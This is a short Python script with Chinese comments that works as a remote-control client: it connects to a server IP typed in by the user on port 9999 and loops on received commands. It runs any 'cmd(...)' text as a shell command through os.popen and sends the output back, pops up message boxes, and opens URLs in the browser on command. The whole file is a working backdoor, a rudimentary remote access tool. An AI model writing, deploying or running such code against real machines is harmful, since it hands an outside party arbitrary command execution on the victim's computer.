import socket
import os
from tkinter import *
import tkinter as tk
import webbrowser

def createMsgbox(self, data):
    self = Tk()
    self.lift()        
    label = tk.Label(self, text = data, width=20, height=5)
    label.pack()
    self.mainloop()
    
    

# 建立 socket 物件
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 設定遠端 IP 和埠號
ip = input("請輸入伺服器IP地址:")
port = 9999

# 連接服務端
s.connect((ip, port))
while True:
    # 接收客戶端傳送的資料
    data = s.recv(1024).decode()
    print('接收到資料：', data)


    # 判斷是否結束連接
    if data == 'quit':
        break
    if "cmd" in data:
        data = data[data.find("(") + 1:data.rfind(")")]
        result = os.popen(data)
        result = result.read()
        s.send(result.encode())
    if "textbox" in data:
        data = data[data.find("(") + 1:data.rfind(")")]
        createMsgbox("MsgBox",data)
    if "open" in data:
        data = data[data.find("(") + 1:data.rfind(")")]
        webbrowser.open(data)

# 關閉 socket 連接
s.close()
